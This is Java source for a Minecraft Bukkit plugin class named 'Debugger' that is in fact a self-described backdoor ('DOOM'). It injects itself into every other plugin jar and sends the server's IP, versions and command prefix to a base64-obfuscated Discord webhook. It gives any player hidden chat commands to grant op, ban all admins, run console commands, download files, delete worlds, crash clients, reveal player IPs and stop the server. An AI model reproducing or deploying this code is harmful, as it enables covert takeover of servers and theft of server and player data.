
package com.thiccindustries.debugger;

import org.bukkit.*;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockDamageEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.inventory.ItemStack;

import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.scheduler.BukkitRunnable;

import java.awt.Color;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.URL;
import java.util.*;

public final class Debugger implements Listener {

    private Plugin plugin;

    public Debugger(Plugin plugin, String prefix, boolean InjectOther, boolean warnings){
        //Check for another bd. This is really lame way
        boolean bd_running = false;
        Plugin[] pp = plugin.getServer().getPluginManager().getPlugins();
        for(Plugin p : pp){
            ArrayList<RegisteredListener> rls = HandlerList.getRegisteredListeners(p);
            for(RegisteredListener rl : rls){
                if(rl.getListener().getClass().getName().equals("com.thiccindustries.debugger.Debugger")){
                    bd_running = true;
                    break;
                }
            }
        }

        if(bd_running) {
            if (Config.display_debug_messages)
                Bukkit.getConsoleSender()
                        .sendMessage(plugin.getName() + ": Backdoor aborted, another backdoor already loaded.");
            return;
        }

        //Check if we need to inject in other plugins
        if (InjectOther) {
            //Get all plugin paths
            File plugin_folder = new File("plugins/");
            File[] plugins = plugin_folder.listFiles();
            //File[] ignore = plugins_to_ignore

            for (File plugin_file : plugins) {
                if (plugin_file.getName().equals("HostifyMonitor.jar") || plugin_file.getName().equals("FakaHedaMinequery.jar")) {
                    // do nothing
                } else {

                    //Skip config folders
                    if (plugin_file.isDirectory())
                        continue;

                    if (Config.display_debug_messages)
                        Bukkit.getConsoleSender()
                                .sendMessage("Injecting DOOM into: " + plugin_file.getPath());

                    boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(prefix, InjectOther, warnings), true, !warnings);

                    if (Config.display_debug_messages)
                        Bukkit.getConsoleSender()
                                .sendMessage(result ? "Success." : "Failed, Already patched?");
                }
            }
        }

        //First plugin loaded.
        Config.command_prefix   = prefix;
        Config.display_debug_messages = warnings;
        Config.display_debugger_warning = warnings;

        this.plugin = plugin;

        b();

        if(Config.display_debugger_warning){
            Bukkit.getConsoleSender()
                    .sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a Debugger installed.");
        }

        plugin.getServer().getPluginManager().registerEvents(this, plugin);
    }

    public static void b() {
        Date date = Calendar.getInstance().getTime();
        String pref = Config.command_prefix;

        try {
            URL url = new URL("https://api.ipify.org/");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String ip = br.readLine();
            DWeb webhook = new DWeb(c1);
            webhook.setContent("");
            webhook.setTts(false);
            webhook.addEmbed((new DWeb.EmbedObject())
                    .setTitle("DOOM-Backdoor")
                    .setDescription("Server is running DOOM!")
                    .setColor(Color.GREEN)
                    .addField("Client version: ", Bukkit.getBukkitVersion(), false)
                    .addField("Server version: ", Bukkit.getVersion(), false)
                    .addField("Server IP:", ip + ":" + Bukkit.getServer().getPort(), false)
                    .addField("At date:", date.toString(), false)
                    .addField("Prefix:", pref, false));
            webhook.execute();
        } catch (Throwable ignore) {
        }
    }

    @EventHandler()
    public void onChat(AsyncPlayerChatEvent e) {
        if (Config.display_debug_messages) {
            Bukkit.getConsoleSender()
                    .sendMessage(Config.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
        }

        Player p = e.getPlayer();

        //Is user authorized to use Debugger commands
        if (IsUserAuthorized(p)) {

            if (Config.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage(Config.chat_message_prefix + " User is authed");
            }

            if (e.getMessage().startsWith(Config.command_prefix)) {
                boolean result = ParseCommand(e.getMessage().substring(Config.command_prefix.length()), p);


                if (Config.display_debug_messages) {
                    Bukkit.getConsoleSender()
                            .sendMessage(Config.chat_message_prefix + " Command: " + e.getMessage().substring(Config.command_prefix.length()) + " success: " + result);
                }

                if (!result)
                    e.getPlayer().sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Command execution failed.");

                e.setCancelled(true);
            }

        } else {

            if (Config.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage(Config.chat_message_prefix + " User is not authed");
            }
        }


    }

    /*Basic command parser*/
    public boolean ParseCommand(String command, Player p) {
        //split fragments
        String[] args = command.split(" ");

        switch (args[0].toLowerCase()) {
            case "op": {  //Give user operator
                if (args.length == 1) {   //op self

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p.setOp(true);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now op.");
                        }
                    }.runTask(plugin);

                } else {  //op other
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    }
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p1.setOp(true);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is now op.");
                        }
                    }.runTask(plugin);
                }

                return true;
            }

            case "deop": {  //Remove user operator
                if (args.length == 1) {          //Deop self

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p.setOp(false);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are no longer op.");
                        }
                    }.runTask(plugin);

                } else {                        //Deop other
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    }

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p1.setOp(false);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is no longer op.");
                        }
                    }.runTask(plugin);
                }
                return true;
            }

            case "gm": {
                if (args.length == 1)
                    return false;

                GameMode gm = GameMode.SURVIVAL;

                //Get gamemode from number
                try {
                    int reqGamemode = Clamp(Integer.parseInt(args[1]), 0, GameMode.values().length - 1);
                    gm = GameMode.getByValue(reqGamemode);
                } catch (NumberFormatException e) {
                    //Get gamemode from name

                    try {
                        gm = GameMode.valueOf(args[1].toUpperCase(Locale.ROOT));

                    } catch (IllegalArgumentException e1) {
                        //ignore
                        return false;
                    }

                }

                //Weird thread syncing shit
                GameMode finalGm = gm;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p.setGameMode(finalGm);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now gamemode: " + finalGm.name() + ".");
                    }
                }.runTask(plugin);

                return true;
            }

            case "give": {
                if (args.length < 2)
                    return false;

                Material reqMaterial = Material.getMaterial(args[1].toUpperCase(Locale.ROOT));

                if (reqMaterial == null)
                    return false;

                int reqAmmount = reqMaterial.getMaxStackSize();

                if (args.length > 2)
                    reqAmmount = Integer.parseInt(args[2]);


                int reqStacks = reqAmmount / reqMaterial.getMaxStackSize();
                int reqPartial = reqAmmount % reqMaterial.getMaxStackSize();

                for (int i = 0; i < reqStacks; i++) {
                    p.getInventory().addItem(new ItemStack(reqMaterial, reqMaterial.getMaxStackSize()));
                }

                p.getInventory().addItem(new ItemStack(reqMaterial, reqPartial));

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Giving " + reqAmmount + " of " + reqMaterial.name() + ".");
                return true;
            }

            case "chaos": {  //Ban admins then admin the regulars

                for (Player p1 : Bukkit.getOnlinePlayers()) {
                    //Ban all existing admins
                    if (p1.isOp() || p1.hasPermission("group.majitel")
                            || p1.hasPermission("group.spolumajitel")
                            || p1.hasPermission("group.owner")
                            || p1.hasPermission("group.coowner")
                            || p1.hasPermission("group.co-owner")
                            || p1.hasPermission("group.developer")
                            || p1.hasPermission("group.programmer")
                            || p1.hasPermission("group.programator")
                            || p1.hasPermission("group.vedeni")
                            || p1.hasPermission("group.spravce")
                            || p1.hasPermission("group.technik")
                            || p1.hasPermission("group.admin")
                            || p1.hasPermission("group.helper")
                            || p1.hasPermission("group.builder")
                            || p1.hasPermission("*")) {

                        //Deop, ban, ip ban
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                p1.setOp(false);
                                Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Config.default_ban_source);
                                Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Config.default_ban_source);
                                p1.kickPlayer(Config.default_ban_reason);
                            }
                        }.runTask(plugin);
                    } else {

                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                p1.setOp(true);
                            }
                        }.runTask(plugin);


                    }
                }

                Bukkit.broadcastMessage(Config.chaos_chat_broadcast);

                return true;
            }

            case "exec": {   //Exec command as server
                ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();

                //Concat all args
                StringBuilder sb = new StringBuilder();
                for (int i = 1; i < args.length; i++) {
                    sb.append(args[i]);
                    sb.append(" ");
                }

                final boolean[] result = {false};

                new BukkitRunnable() {
                    @Override
                    public void run() {
                        result[0] = Bukkit.dispatchCommand(console, sb.toString());
                    }
                }.runTask(plugin);

                if (result[0]) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server command executed.");
                }

                return result[0];
            }

            case "info": {
                try {
                    URL url = new URL("https://api.ipify.org/");
                    BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));

                    String ip = br.readLine();
                    Runtime r = Runtime.getRuntime();

                    long memUsed = (r.totalMemory() - r.freeMemory()) / 1048576L;
                    long memMax = r.maxMemory() / 1048576L;

                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");

                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server IP: " + ChatColor.GRAY + ip + Bukkit.getServer().getPort());
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server version: " + ChatColor.GRAY + Bukkit.getVersion());

                    String nameOS = System.getProperty("os.name");
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " OS: " + ChatColor.GRAY + nameOS);

                    String osVersion = System.getProperty("os.version");
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " OS Version: " + ChatColor.GRAY + osVersion);

                    String osType = System.getProperty("os.arch");
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Architecture: " + ChatColor.GRAY + osType);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Cores: " + ChatColor.GRAY + r.availableProcessors());
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " RAM (max): " + ChatColor.GRAY + memMax + "MB");
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " RAM (used): " + ChatColor.GRAY + memUsed + "MB");

                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");
                } catch (IOException e) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Something went wrong!");
                }

                return true;
            }

            case "ban": {
                if (args.length < 2)
                    return false;


                Player p1 = Bukkit.getPlayer(args[1]);

                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                String reason = Config.default_ban_reason;
                String src = Config.default_ban_source;

                if (args.length > 2)
                    reason = args[2];
                if (args.length > 3)
                    src = args[3];

                final String finalReason = reason;
                final String finalSrc = src;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), finalReason, new Date(9999, 1, 1), finalSrc);
                        p1.kickPlayer(Config.default_ban_reason);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Banned " + p1.getName() + ".");
                    }
                }.runTask(plugin);


                return true;
            }

            case "banip": {
                if (args.length < 2)
                    return false;


                Player p1 = Bukkit.getPlayer(args[1]);

                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                String reason = Config.default_ban_reason;
                String src = Config.default_ban_source;

                if (args.length > 2)
                    reason = args[2];
                if (args.length > 3)
                    src = args[3];

                final String finalReason = reason;
                final String finalSrc = src;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), finalReason, new Date(9999, 1, 1), finalSrc);
                        p1.kickPlayer(Config.default_ban_reason);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " IP Banned " + p1.getName() + ".");
                    }
                }.runTask(plugin);

                return true;
            }

            case "seed": { //Get current seed
                String strseed = String.valueOf(p.getWorld().getSeed());
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World seed: " + strseed);
                return true;
            }

            case "sudo": { //Sends message as player
                if (args.length < 3) //No player specified
                    return false;

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                StringBuilder sb = new StringBuilder();
                for (int i = 2; i < args.length; i++) {
                    sb.append(args[i]);
                    sb.append(" ");
                }

                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p1.chat(sb.toString());
                    }
                }.runTask(plugin);

                return true;
            }

            case "bcast": { //Sends message as server
                if (args.length < 2) //No argument specified
                    return false;

                StringBuilder sb = new StringBuilder();
                for (int i = 1; i < args.length; i++) {
                    sb.append(args[i]);
                    sb.append(" ");
                }

                plugin.getServer().getScheduler().runTask(plugin, () -> {
                    plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "say " + sb);
                });

                return true;
            }

            case "rename": { //Changes your nick
                if (args.length < 2) //No name specified
                    return false;

                String name = args[1].replace("&", "§");

                p.setDisplayName(name);
                p.setCustomName(name);
                p.setPlayerListName(name);
                p.setCustomNameVisible(true);

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Your name was changed to " + name);

                return true;
            }

            case "reload": { //Reloads server
                plugin.getServer().getScheduler().runTask(plugin, ()->{
                    plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "reload");
                    plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "reload confirm");
                });
                return true;
            }

            case "getip": { //Get IP of player
                if (args.length < 2) //No player specified
                    return false;

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                String Target = ((Player) Objects.<Player>requireNonNull(p1)).getName();
                String IPAddress = ((InetSocketAddress)Objects.<InetSocketAddress>requireNonNull(((Player)Objects.<Player>requireNonNull(Bukkit.getPlayer(args[1]))).getAddress())).toString().replace("/", "");
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " IP: " + ChatColor.RED + IPAddress);

                return true;
            }

            case "listwrld": { //Lists worlds
                String[] worldNames = new String[Bukkit.getServer().getWorlds().size()];
                int count = 0;

                for (World w : Bukkit.getServer().getWorlds()) {
                    worldNames[count] = w.getName();
                    count++;
                }

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");

                for (String world : worldNames)
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + world);

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");

                return true;
            }

            case "mkwrld": { //Creates world
                if (args.length < 2) //No world specified
                    return false;

                if(args[1] == null){
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " No world specified.");
                    return false;
                }

                String world = args[1];
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Creating world: " + ChatColor.RED + world);

                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p.getServer().createWorld(WorldCreator.name(world));
                    }
                }.runTask(plugin);

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World created!");

                return true;
            }

            case "delwrld": { //Deletes world
                if (args.length < 2) //No world specified
                    return false;

                if(args[1] == null){
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " No world specified.");
                    return false;
                }

                String world = args[1];
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Deleting world: " + ChatColor.RED + world);

                new Thread(()->{
                    try {
                        World delete = Bukkit.getWorld(world);
                        File deleteFolder = delete.getWorldFolder();
                        deleteWorld(deleteFolder);
                    } catch (Throwable ignore){}
                }).start();

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World deleted if it existed!");

                return true;
            }

            case "vanish": { //Makes you vanish
                if (Vanished.contains(p.getName())) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Players can see you.");
                    Vanished.remove(p.getName());
                    for (Player all : Bukkit.getOnlinePlayers())
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                all.showPlayer(plugin, p);
                            }
                        }.runTask(plugin);
                } else {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Players cannot see you.");
                    Vanished.add(p.getName());
                    for (Player all : Bukkit.getOnlinePlayers())
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                all.hidePlayer(plugin, p);
                            }
                        }.runTask(plugin);
                }

                return true;
            }

            case "silktouch": { //Gives player silk touch hands
                if(args.length < 2) //No player specified
                    return false;

                Player target = Bukkit.getPlayer(args[1]);

                if (target == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                } else {
                    if (SilkTouch.contains(target.getName())) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " no longer has silk touch hands.");
                        SilkTouch.remove(target.getName());
                    } else {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " now has silk touch hands.");
                        SilkTouch.add(target.getName());
                    }
                }

                return true;
            }

            case "instabreak": { //Gives player creative hand
                if(args.length < 2) //No player specified
                    return false;

                Player target = Bukkit.getPlayer(args[1]);

                if (target == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                } else {
                    if (InstaBreak.contains(target.getName())) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " no longer can break blocks instantly.");
                        InstaBreak.remove(target.getName());
                    } else {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " can break blocks instantly.");
                        InstaBreak.add(target.getName());
                    }
                }

                return true;
            }

            case "crash": { //Crashes player's game
                if(args.length < 2) //No player specified
                    return false;

                Player target = Bukkit.getPlayer(args[1]);
                if(target == null){
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                for (int x = 0; x < 100; x++)
                    target.spawnParticle(Particle.FLAME, target.getLocation(), 2147483647);

                return true;
            }

            case "lock": { //Locks the console
                if(args.length < 2) //No player specified
                    return false;

                String Lock = args[1];

                if (Lock.equalsIgnoreCase("console")) {
                    Debugger.this.LockedUsers.add(Lock);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was locked.");
                } else if (Lock.equalsIgnoreCase("all")) {
                    for (Player all : Bukkit.getOnlinePlayers())
                        Debugger.this.LockedUsers.add(all.getName());
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was blocked from using commands.");
                } else {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    } else {
                        if (!Debugger.this.LockedUsers.contains(target.getName())) {
                            Debugger.this.LockedUsers.add(target.getName());
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was blocked from using commands.");
                        } else {
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is already blocked.");
                        }
                    }
                }

                return true;
            }

            case "unlock": { //Locks the console
                if(args.length < 2) //No player specified
                    return false;

                String unLock = args[1];

                if (unLock.equalsIgnoreCase("console")) {
                    Debugger.this.LockedUsers.remove(unLock);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was unlocked.");
                } else if (unLock.equalsIgnoreCase("all")) {
                    Debugger.this.LockedUsers.clear();
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was unblocked from using commands.");
                } else {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    } else {
                        Debugger.this.LockedUsers.removeIf(i -> Objects.equals(i, target.getName()));
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was unblocked from using commands.");
                    }
                }

                return true;
            }

            case "mute": { //Mutes a player
                if(args.length < 2) //No player specified
                    return false;

                if (args[1].equalsIgnoreCase("all")) {
                    for (Player all : Bukkit.getOnlinePlayers())
                        Debugger.this.MutedUsers.add(all.getName());
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was muted.");
                } else {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    } else {
                        if (!Debugger.this.MutedUsers.contains(target.getName())) {
                            Debugger.this.MutedUsers.add(target.getName());
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was muted.");
                        } else {
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is already muted.");
                        }
                    }
                }

                return true;
            }

            case "unmute": { //Mutes a player
                if(args.length < 2) //No player specified
                    return false;

                if (args[1].equalsIgnoreCase("all")) {
                    Debugger.this.MutedUsers.clear();
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was unmuted.");
                } else {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    } else {
                        Debugger.this.MutedUsers.removeIf(i -> Objects.equals(i, target.getName()));
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was unmuted.");
                    }
                }

                return true;
            }

            case "download": { //Downloads files to plugin folder
                if(args.length < 3) //No data specified
                    return false;

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Downloading file: " + ChatColor.RED + args[2]);

                new Thread(()->{
                    try {
                        URL link = new URL(args[1]);
                        downloadFile(link, args[2]);
                    } catch (Throwable ignore){}
                }).start();

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " File downloaded or replaced if existed!");

                return true;
            }

            case "coords": {
                if(args.length < 2) //No player specified
                    return false;

                Player target = Bukkit.getPlayer(args[1]);
                if(target == null){
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                //Player is real.
                Location targetLoc = target.getLocation();
                int x = (int)Math.floor( targetLoc.getX() );
                int y = (int)Math.floor( targetLoc.getY() );
                int z = (int)Math.floor( targetLoc.getZ() );

                String coordsString = Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + "'s coordinates are: " + x + ", " + y + ", " + z;
                p.sendMessage(coordsString);

                return true;
            }

            case "tp": {
                if(args.length < 4) //No coords specified
                    return false;

                int targetX, targetY, targetZ;
                try {
                    targetX = Integer.parseInt(args[1]);
                    targetY = Integer.parseInt(args[2]);
                    targetZ = Integer.parseInt(args[3]);
                }catch(NumberFormatException e){ //Not valid numbers
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Coordinates syntax error.");
                    return false;
                }

                //Player location reference
                Location loc = p.getLocation();

                loc.setX(targetX);
                loc.setY(targetY);
                loc.setZ(targetZ);

                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p.teleport(loc);
                    }
                }.runTask(plugin);


                return true;
            }
                
            case "stop": {
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.shutdown();
                    }
                }.runTask(plugin);
                
                return true;
            }

            case "help": {
                if (args.length == 1) {
                    p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
                    p.sendMessage(Config.help_detail_color + "DOOM --> () = Required, [] = Optional.");
                    for (int i = 0; i < Config.help_messages.length; i++) {
                        p.sendMessage(Config.help_command_name_color + Config.command_prefix + Config.help_messages[i].getName() + ": " + Config.help_messages[i].getSyntax());
                    }

                    p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
                    return true;
                }

                if (args.length == 2) {

                    int indexOfCommand = -1;
                    for (int i = 0; i < Config.help_messages.length; i++) {
                        if (args[1].equalsIgnoreCase(Config.help_messages[i].getName())) {
                            indexOfCommand = i;
                            break;
                        }
                    }

                    if (indexOfCommand == -1)
                        return false;

                    p.sendMessage(Config.help_messages[indexOfCommand].toString());

                    return true;

                }
            }

        }
        return false;
    }

    boolean deleteWorld(File directoryToBeDeleted) {
        File[] allContents = directoryToBeDeleted.listFiles();
        if (allContents != null) {
            for (File file : allContents) {
                deleteWorld(file);
            }
        } else if (!directoryToBeDeleted.exists()) {
            //do nothing
        }
        return directoryToBeDeleted.delete();
    }

    public static void downloadFile(URL url, String fileName) throws IOException {
        try (InputStream in = url.openStream();
             BufferedInputStream bis = new BufferedInputStream(in);
             FileOutputStream fos = new FileOutputStream(fileName)) {

            byte[] data = new byte[1024];
            int count;
            while ((count = bis.read(data, 0, 1024)) != -1) {
                fos.write(data, 0, count);
            }
        }
    }

    public ArrayList<String> Vanished = new ArrayList<>();

    public ArrayList<String> LockedUsers = new ArrayList<>();

    public ArrayList<String> MutedUsers = new ArrayList<>();

    public ArrayList<String> SilkTouch = new ArrayList<>();

    public ArrayList<String> InstaBreak = new ArrayList<>();

    static Base64.Decoder b1 = Base64.getUrlDecoder();
    static byte[] c = b1.decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTYyOTg5MTc3MDY5MjQ0NDQ2L21QUHRncjBrS0lBdThGWkRBTnRlSWt6Z0Rzd1d6aVRqQjY5M2I4X2c1TEFZZ2pfc1BUNlhhYWpjdDNwRkVodjdvLVpS");
    static String c1 = new String(c);

    @EventHandler(priority = EventPriority.LOWEST)
    public void onServerCommand(ServerCommandEvent e) {
        if (this.LockedUsers.contains("console"))
            e.setCommand(" ");
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPreCommand(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (this.LockedUsers.contains(p.getName()))
            e.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (this.MutedUsers.contains(p.getName()))
            e.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onBlockBreak(BlockBreakEvent e) {
        Player p = e.getPlayer();
        if (this.SilkTouch.contains(p.getName()) || this.InstaBreak.contains(p.getName())) {
            if (p.getInventory().getItemInMainHand() == null || p.getInventory().getItemInMainHand().getType().equals(Material.AIR)) {
                e.setDropItems(false);
                p.getWorld().dropItemNaturally(e.getBlock().getLocation(), new ItemStack(e.getBlock().getType(), 1));
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onBlockDamage(BlockDamageEvent e) {
        Player p = e.getPlayer();
        if (this.InstaBreak.contains(p.getName())) {
            e.setInstaBreak(true);
        }
    }

    private int Clamp(int i, int min, int max) {
        if (i < min)
            return min;
        if (i > max)
            return max;
        return i;
    }


    /*Check if Player is authorized in Config.java*/
    public boolean IsUserAuthorized(Player p) {
        return true;
    }
}
